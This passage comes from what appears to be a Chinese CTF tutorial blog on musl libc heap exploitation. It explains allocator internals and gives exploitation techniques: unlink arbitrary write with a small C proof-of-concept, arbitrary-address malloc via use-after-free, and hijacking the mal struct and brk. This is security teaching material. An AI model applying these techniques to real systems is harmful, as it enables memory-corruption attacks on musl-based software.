<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span> &lt;&lt; i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span> &lt;&lt; i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        <span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>) self + SIZE_ALIGN + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">        <span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>) next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">        __madvise((<span class="type">void</span> *) a, b - a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">            MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br></pre></td></tr></table></figure></div>

<h2 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>musl 采用 <code>unbin</code> 函数从 <code>bins</code> 中取出 <code>chunk</code> ，对应 glibc 中的 <code>unlink</code> ，但是 <code>unbin</code> 中检查不足没有检查链表完整性，可以进行利用实现任意地址写。如果泄露了堆地址还可以写 rop 链进行 ROP 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a8db69d1ca1fe564c331a93f283ffa4b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >

<p><strong>unlink 的作用是可以在两位置写入可读写地址，很多攻击手法都是建立在 unlink 的基础上的。</strong><br><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_unlink_old" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERHEAD (2*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_TO_CHUNK(p) (struct chunk *)((char *)(p) - OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_TO_MEM(c) (void *)((char *)(c) + OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_INUSE  ((size_t)1)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> psize, csize;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> <span class="title">target</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">fake_chunk</span> =</span> <span class="built_in">malloc</span>(<span class="number">0x30</span>) + <span class="number">0x10</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next_chunk</span> =</span> MEM_TO_CHUNK(<span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    fake_chunk-&gt;psize |= C_INUSE;</span><br><span class="line">    fake_chunk-&gt;prev = &amp;target;</span><br><span class="line">    fake_chunk-&gt;next = &amp;target;</span><br><span class="line">    next_chunk-&gt;psize = <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">free</span>(CHUNK_TO_MEM(next_chunk));</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个 poc 是通过 <code>chunk</code> 合并来触发的 unlink ，因此需要满足以下条件：</p>
<ul>
<li>为了 <code>free</code> 函数能够调用 <code>__bin_chunk</code> 需要 <code>next_chunk</code> 的 <code>csize</code> 的 <code>C_INUSE</code> 位置 1 。</li>
<li>为了绕过 <code>if (next-&gt;psize != self-&gt;csize) a_crash();</code> 检测需要伪造 <code>next_chunk</code> 的 <code>csize</code> 和 <code>next_chunk</code> 的下一个 <code>chunk</code> 的 <code>psize</code>。</li>
<li>为了使 <code>alloc_rev</code> 调用 <code>unbin</code> 函数将 <code>fake_chunk</code> 解链，满足 <code>next_chunk-&gt;psize</code> 的 <code>C_INUSE</code> 位不置位。</li>
</ul>
<h3 id="任意地址-malloc"><a href="#任意地址-malloc" class="headerlink" title="任意地址 malloc"></a>任意地址 malloc</h3><p>以这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/2021_NSSC_final_Musl" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例。</p>
<p>musl heap 在 <code>malloc</code> 时没有检查，因此只要修改释放的 <code>chunk</code> 的 <code>next</code> 指针就可以实现任意地址 <code>malloc</code> 。但是有 3 个地方需要注意。</p>
<ul>
<li><p>在 <code>unbin</code> 中判断 <code>bin</code> 为空的条件是</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">    a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br></pre></td></tr></table></figure></div>

<p>为了确保下一次能申请出 <code>chunk</code> 来，需要确保本次申请的 <code>chunk</code> 的 <code>prev</code> 和 <code>next</code> 不同。</p>
</li>
<li><p>由于 <code>unbin</code> 中的解链操作，需要 <code>bins</code> 头指向的 <code>chunk</code> 的 <code>prev</code> 和 <code>next</code> 可写。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>由于 <code>unbin</code> 在完成解链后会修改下一个 <code>chunk</code> 的 <code>psize</code> 的 <code>C_INUSE</code> 位，因此需要 <code>NEXT_CHUNK(c)-&gt;psize</code> 可写，通常需要在目标地址往前找一个偏移使得 <code>fake chunk</code> 的 <code>csize</code> 为一个较小的数。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>因此有如下攻击流程：</p>
<ul>
<li><p>首先利用一次 unlink 将 <code>fake chunk</code> 的 <code>next</code> 写入可读写地址。依据题目中的具体情况，这里采用 UAF 修改  <code>prev</code> 和 <code>next</code> 的方式来实现 unlink 。另外由于 unlink 和 后续攻击用到的 <code>chunk</code> 大小相同，因此这里将  <code>prev</code> 和 <code>next</code> 分别修改为 <code>&amp;fake_chunk - 8</code> 和 <code>&amp;fake_chunk</code> 来避免之后不能从 <code>bin</code> 中申请 <code>chunk</code> 。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c793308106bca599336cdca5d5c5bbbf.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
</li>
<li><p>之后再次通过 UAF 修改 <code>next</code> 指针指向 <code>fake chunk</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fba90e1ac3dbf27d07418614456cf65b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></li>
</ul>
<h3 id="劫持-mal-实现连续任意地址-malloc"><a href="#劫持-mal-实现连续任意地址-malloc" class="headerlink" title="劫持 mal 实现连续任意地址 malloc"></a>劫持 mal 实现连续任意地址 malloc</h3><p>以这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-musl" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例。</p>
<p>对于同一大小的 <code>chunk</code> 来说，前面任意地址 <code>malloc</code> 的方法只能进行一次，因为经过一次任意地址 <code>malloc</code> 之后 <code>mal</code> 的 <code>bin</code> 的 <code>head</code> 指针已经不可控，因此不能再次任意地址 <code>malloc</code> 。</p>
<p>但是如果劫持 <code>mal</code> 结构体的话就可以连续任意地址 <code>malloc</code>，不过任意地址 <code>malloc</code> 的前提是 <code>fake chunk</code> 的 <code>csize</code> ， <code>next</code> 和 <code>prev</code> 必须满足前面任意地址 <code>malloc</code> 的条件。由于劫持了 <code>mal</code> 结构体之后不容易 unlink ，因此需要在劫持 <code>mal</code> 结构体之前在需要 <code>malloc</code> 的地址通过 unlink 位置 <code>fake chunk</code> 的 <code>next</code> 和 <code>prev</code> 。另外需要选择目标地址往前一点的偏移使得 <code>csize</code> 合法，之后不停的任意地址 <code>malloc</code> 利用前面的 <code>fake chunk</code> 伪造后面 <code>fake chunk</code> 的头直到把目标地址申请出来。</p>
<p>另外由于部分 <code>chunk</code> 是在程序上的，因此可以通过部分地址覆盖 <code>mal</code> 上的这些程序地址从而绕过 PIE 将 <code>chunk</code> 申请到程序的某些结构上。例如这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/WMCTF-Nescafe" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h3 id="劫持-brk-控制-malloc-返回值"><a href="#劫持-brk-控制-malloc-返回值" class="headerlink" title="劫持 brk 控制 malloc 返回值"></a>劫持 brk 控制 malloc 返回值</h3><p>还是以<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-musl" >这道题<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例</p>
<p>当 <code>bins</code> 中没有 <code>chunk</code> 可供分配（即 <code>binmap</code> 为 0 时）会调用 <code>__expand_heap</code> 函数申请一块新的堆空间用于构造 <code>chunk</code> 。因此可以通过任意地址写修改 <code>__expand_heap</code> 的 <code>brk</code> 然后劫持 <code>mal</code> 设置 <code>binmap</code> 为 0 来实现对 <code>malloc</code> 返回值的控制。</p>
<p>获取 <code>brk</code> 在 <code>libc.so</code> 中偏移的方法如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/968e6405cc245317e96e8cebbfb23e3f.png"
                     
                ></p>
<h1 id="musl-heap-musl-1-2-3"><a href="#musl-heap-musl-1-2-3" class="headerlink" title="musl heap (musl-1.2.3)"></a>musl heap (musl-1.2.3)</h1><h2 id="基本数据结构-1"><a href="#基本数据结构-1" class="headerlink" title="基本数据结构"></a>基本数据结构</h2><p>在 <code>meta.h</code> 文件夹中定义了 musl 内存管理相关的结构。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/d79edcc2ff4572a91c7429c108bd89e1.png"
                     
                ></p>
<h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>musl 内存管理时经常使用双向链表来缓存一些 <code>meta</code> 的结构，我们暂且称它为 deque 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d32bd917c91d670b1af725390e1c48c.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>对应的操作有 <code>queue</code>，<code>dequeue</code>，<code>dequeue_head</code> 三个操作。</p>
<h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><p><code>queue</code> 函数的作用是将 <code>*m</code> 插入到 <code>*phead</code> 指向的 deque 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    assert(!m-&gt;next);</span><br><span class="line">    assert(!m-&gt;prev);</span><br><span class="line">    <span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">        m-&gt;next = head;</span><br><span class="line">        m-&gt;prev = head-&gt;prev;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        m-&gt;prev = m-&gt;next = m;</span><br><span class="line">        *phead = m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h4><p><code>dequeue</code> 函数的作用是将 <code>*m</code> 从 <code>*phead</code> 指向的 deque 中取出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="dequeue-head"><a href="#dequeue-head" class="headerlink" title="dequeue_head"></a>dequeue_head</h4><p><code>dequeue_head</code> 函数的作用是将 <code>*phead</code> 指向的 <code>meta</code> 结构从 <code>*phead</code> 指向的 deque 中取出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">dequeue_head</span><span class="params">(<span class="keyword">struct</span> meta **phead)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *phead;</span><br><span class="line">    <span class="keyword">if</span> (m) dequeue(phead, m);</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a>malloc_context</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个结构体是musl libc的堆管理最上层结构，其中字段的含义分别为：</p>
<ul>
<li><p><code>uint64_t secret</code>：一个随机生成的数，用于检查meta的合法性，也即一个 check guard 。</p>
</li>
<li><p><code>int init_done</code>：判断 <code>malloc_context</code> 是否初始化完成，在 <code>alloc_meta</code> 函数中进行检查，如果没有则进行初始化，否则跳过初始化流程，这里的初始化指的是初始化 <code>secret</code> 。</p>
</li>
<li><p><code>unsigned mmap_counter</code>：mmap 计数器，通过 mmap 分配了多少次空间用于内存分配。</p>
</li>
<li><p><code>struct meta *free_meta_head</code>：被释放的 <code>meta</code> 结构体构成的双向链表表头，<code>meta</code> 结构体是 musl libc 内存分配的低一级结构。</p>
</li>
<li><p><code>struct meta *avail_meta</code>：指向空闲的 meta 。</p>
</li>
<li><p><code>size_t avail_meta_count</code>：musl 保留但未使用的 <code>meta</code> 的数量。</p>
</li>
<li><p><code>avail_meta_area_count</code>：musl 保留但未使用的 <code>meta_area</code> 的数量。</p>
</li>
<li><p><code>meta_alloc_shift</code>：当没有空闲 <code>meta_area</code> 且 brk 不能为 <code>meta_arena</code> 申请连续内存时需要采用 mmap 的方式申请 <code>meta_arena</code>，<code>meta_alloc_shift</code> 用于计算了此时需要扩展的内存大小，这个值是动态调节的。</p>
</li>
<li><p><code>struct meta_area *meta_area_head, *meta_area_tail</code>：存放 <code>meta_area</code> 的单向链表，只作记录，没什么实际作用。</p>
</li>
<li><p><code>unsigned char *avail_meta_areas</code>：musl 保留但未使用的 <code>meta_area</code> 的起始地址，具体见后面对 <code>alloc_meta</code> 函数的分析。</p>
</li>
<li><p><code>struct meta *active[48]</code>：可以直接参与内存分配的 <code>meta</code>，按照 <code>meta</code> 管理的内存中 <code>chunk</code> 的大小划分为 48 组，每个组由 <code>meta</code> 形成一个 deque 。<br>48 个组中 <code>chunk</code> 大小以及 <code>malloc</code> 的 size 大小对应关系如下：</p>
<table>
<thead>
<tr>
<th>sc</th>
<th>chunk size</th>
<th>min size</th>
<th>max size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x10</td>
<td>0x0</td>
<td>0xc</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0xd</td>
<td>0x1c</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x1d</td>
<td>0x2c</td>
</tr>
<tr>
<td>3</td>
<td>0x40</td>
<td>0x2d</td>
<td>0x3c</td>
</tr>
<tr>
<td>4</td>
<td>0x50</td>
<td>0x3d</td>
<td>0x4c</td>
</tr>
<tr>
<td>5</td>
<td>0x60</td>
<td>0x4d</td>
<td>0x5c</td>
</tr>
<tr>
<td>6</td>
<td>0x70</td>
<td>0x5d</td>
<td>0x6c</td>
</tr>
<tr>
<td>7</td>
<td>0x80</td>
<td>0x6d</td>
<td>0x7c</td>
</tr>
<tr>
<td>8</td>
<td>0x90</td>
<td>0x7d</td>
<td>0x8c</td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0x8d</td>
<td>0x9c</td>
</tr>
<tr>
<td>10</td>
<td>0xc0</td>
<td>0x9d</td>
<td>0xbc</td>
</tr>
<tr>
<td>11</td>
<td>0xf0</td>
<td>0xbd</td>
<td>0xec</td>
</tr>
<tr>
<td>12</td>
<td>0x120</td>
<td>0xed</td>
<td>0x11c</td>
</tr>
<tr>
<td>13</td>
<td>0x140</td>
<td>0x11d</td>
<td>0x13c</td>
</tr>
<tr>
<td>14</td>
<td>0x190</td>
<td>0x13d</td>
<td>0x18c</td>
</tr>
<tr>
<td>15</td>
<td>0x1f0</td>
<td>0x18d</td>
<td>0x1ec</td>
</tr>
<tr>
<td>16</td>
<td>0x240</td>
<td>0x1ed</td>
<td>0x23c</td>
</tr>
<tr>
<td>17</td>
<td>0x2a0</td>
<td>0x23d</td>
<td>0x29c</td>
</tr>
<tr>
<td>18</td>
<td>0x320</td>
<td>0x29d</td>
<td>0x31c</td>
</tr>
<tr>
<td>19</td>
<td>0x3f0</td>
<td>0x31d</td>
<td>0x3ec</td>
</tr>
<tr>
<td>20</td>
<td>0x480</td>
<td>0x3ed</td>
<td>0x47c</td>
</tr>
<tr>
<td>21</td>
<td>0x540</td>
<td>0x47d</td>
<td>0x53c</td>
</tr>
<tr>
<td>22</td>
<td>0x660</td>
<td>0x53d</td>
<td>0x65c</td>
</tr>
<tr>
<td>23</td>
<td>0x7f0</td>
<td>0x65d</td>
<td>0x7ec</td>
</tr>
<tr>
<td>24</td>
<td>0x920</td>
<td>0x7ed</td>
<td>0x91c</td>
</tr>
<tr>
<td>25</td>
<td>0xaa0</td>
<td>0x91d</td>
<td>0xa9c</td>
</tr>
<tr>
<td>26</td>
<td>0xcc0</td>
<td>0xa9d</td>
<td>0xcbc</td>
</tr>
<tr>
<td>27</td>
<td>0xff0</td>
<td>0xcbd</td>
<td>0xfec</td>
</tr>
<tr>
<td>28</td>
<td>0x1240</td>
<td>0xfed</td>
<td>0x123c</td>
</tr>
<tr>
<td>29</td>
<td>0x1540</td>
<td>0x123d</td>
<td>0x153c</td>
</tr>
<tr>
<td>30</td>
<td>0x1990</td>
<td>0x153d</td>
<td>0x198c</td>
</tr>
<tr>
<td>31</td>
<td>0x1ff0</td>
<td>0x198d</td>
<td>0x1fec</td>
</tr>
<tr>
<td>32</td>
<td>0x2480</td>
<td>0x1fed</td>
<td>0x247c</td>
</tr>
<tr>
<td>33</td>
<td>0x2aa0</td>
<td>0x247d</td>
<td>0x2a9c</td>
</tr>
<tr>
<td>34</td>
<td>0x3320</td>
<td>0x2a9d</td>
<td>0x331c</td>
</tr>
<tr>
<td>35</td>
<td>0x3ff0</td>
<td>0x331d</td>
<td>0x3fec</td>
</tr>
<tr>
<td>36</td>
<td>0x4910</td>
<td>0x3fed</td>
<td>0x490c</td>
</tr>
<tr>
<td>37</td>
<td>0x5540</td>
<td>0x490d</td>
<td>0x553c</td>
</tr>
<tr>
<td>38</td>
<td>0x6650</td>
<td>0x553d</td>
<td>0x664c</td>
</tr>
<tr>
<td>39</td>
<td>0x7ff0</td>
<td>0x664d</td>
<td>0x7fec</td>
</tr>
<tr>
<td>40</td>
<td>0x9240</td>
<td>0x7fed</td>
<td>0x923c</td>
</tr>
<tr>
<td>41</td>
<td>0xaaa0</td>
<td>0x923d</td>
<td>0xaa9c</td>
</tr>
<tr>
<td>42</td>
<td>0xccc0</td>
<td>0xaa9d</td>
<td>0xccbc</td>
</tr>
<tr>
<td>43</td>
<td>0xfff0</td>
<td>0xccbd</td>
<td>0xffec</td>
</tr>
<tr>
<td>44</td>
<td>0x12480</td>
<td>0xffed</td>
<td>0x1247c</td>
</tr>
<tr>
<td>45</td>
<td>0x15540</td>
<td>0x1247d</td>
<td>0x1553c</td>
</tr>
<tr>
<td>46</td>
<td>0x19980</td>
<td>0x1553d</td>
<td>0x1997c</td>
</tr>
<tr>
<td>47</td>
<td>0x1fff0</td>
<td>0x1997d</td>
<td>0x1ffec</td>
</tr>
</tbody></table>
</li>
<li><p><code>size_t usage_by_class[48]</code>：对应大小的缓存的所有 <code>meta</code> 的 <code>group</code> 所管理的 chunk 个数。</p>
</li>
<li><p><code>uint8_t unmap_seq[32], bounces[32]</code>：参与 <code>alloc_group</code> 中计算新分配 group 的大小。</p>
</li>
<li><p><code>uint8_t seq</code>：参与 <code>alloc_group</code> 中计算新分配 group 的大小。</p>
</li>
<li><p><code>uintptr_t brk</code>：记录目前的 <code>brk(0)</code> ，如果 brk 不能分配连续内存则该值设为 -1 。</p>
</li>
</ul>
<p><code>malloc_context</code> 被实例化为全局变量 <code>ctx</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ctx __malloc_context</span></span><br><span class="line"></span><br><span class="line">__attribute__((__visibility__(<span class="string">&quot;hidden&quot;</span>))) <span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></figure></div>

